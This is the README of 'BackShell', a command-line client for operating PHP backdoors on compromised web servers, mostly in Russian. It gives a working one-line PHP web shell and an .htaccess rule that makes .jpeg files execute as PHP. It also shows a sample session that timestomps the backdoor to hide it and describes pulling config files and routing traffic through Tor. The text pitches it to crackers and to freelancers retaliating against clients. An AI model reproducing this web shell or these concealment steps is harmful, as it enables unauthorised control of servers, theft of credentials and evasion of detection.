# BackShell by tz4678

Command-line tool for backdoor exploitation.

Этот скрипт может быть полезен не только для мамкиных крякеров, но и для фрилансеров, которые хотят обезопасить себя от кидалова со стороны жуликоватых заказчиков из числа выходцев из СНГ.

```zsh
$ pip install backshell

$ backshell 'https://vuln.com/path/to/backdoor/ajax.php'
 ____             _     ____  _          _ _
| __ )  __ _  ___| | __/ ___|| |__   ___| | |
|  _ \ / _` |/ __| |/ /\___ \| '_ \ / _ \ | |
| |_) | (_| | (__|   <  ___) | | | |  __/ | |
|____/ \__,_|\___|_|\_\|____/|_| |_|\___|_|_|
v0.1.1 by tz4678

Type 'help' for more information.
backshell> touch -a -m -t 201705030100.12 backdoor.php

backshell> ls -lah
total 36K
drwxr-xr-x  5 <vanished> <vanished> 4.0K Aug  4 00:26 .
drwxr-xr-x 18 <vanished> <vanished> 4.0K Jan 17  2018 ..
-rw-r--r--  1 <vanished> <vanished>  533 May  3  2017 .jshintrc
-rw-r--r--  1 <vanished> <vanished> 2.7K May  3  2017 Gruntfile.js
-rw-r--r--  1 <vanished> <vanished>   47 May  3  2017 ajax.php
drwxr-xr-x  4 <vanished> <vanished> 4.0K May  3  2017 images
drwxr-xr-x  4 <vanished> <vanished> 4.0K May  3  2017 js
-rw-r--r--  1 <vanished> <vanished>  466 May  3  2017 package.json
drwxr-xr-x  2 <vanished> <vanished> 4.0K May  3  2017 resource

backshell> ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
<vanished>  786766  0.1  0.0 382984 24116 ?        Ss   00:45   0:00 lsphp
<vanished>  787446  0.0  0.0 383416 10240 ?        Ss   00:46   0:00 <vanished>
<vanished>  787447  0.0  0.0   9776  1140 ?        S    00:46   0:00 sh -c ps -aux 2>&1
<vanished>  787448  0.0  0.0  49836  1652 ?        R    00:46   0:00 ps -aux

backshell> exit
```

Backdoor example:

```php
<?php @passthru(base64_decode($_REQUEST['c']));
```

Base64 нужен для обхода `magic_quotes_gpc = On`, который до сих пор много где включен, а так же для работы с бинарными данными в Node.js и т.п.

Такой простой бекдор, конечно, быстро спалят.

`.htaccess`:

```htaccess
AddType application/x-httpd-php .jpeg
```

Теперь файлы с расширением `.jpeg` будут выполняться как php.

## Examples

```zsh
# Help
backshell> help

# Download file from server
backshell> download config.php
Saved as XXXX.config.php

# Upload file to server
backshell> upload script.php

# Edit file on server
backshell> edit index.php
```

## Ограничения

Так как каждый раз запускается новая сессия шелл, то такие команды как `cd` работают не так как ожидается:

```zsh
backshell> cd /tmp; echo $PWD
/tmp

backshell> pwd
/path/to/backdoor
```

Решения:

- При запуске backshell указывать аргумент `--cwd`;
- Использовать команду `cdx`.

Так же не будут работать интерактивные команды типа `less` и др.

Ограничение на длинну команды:

```zsh
$ getconf ARG_MAX
2097152
```

Чтобы скачать файл большого размера либо каталог, упакуйте его с помощью tar, переместите его в ассеты и выкачайте curl/wget.

Вызов команды edit при работе через torify приводит к ошибке:

```zsh
1596550567 WARNING torsocks[373221]: [syscall] Unsupported syscall number 217. Denying the call (in tsocks_syscall() at syscall.c:567)
```

Это баг torsocks и хз когда его исправят.
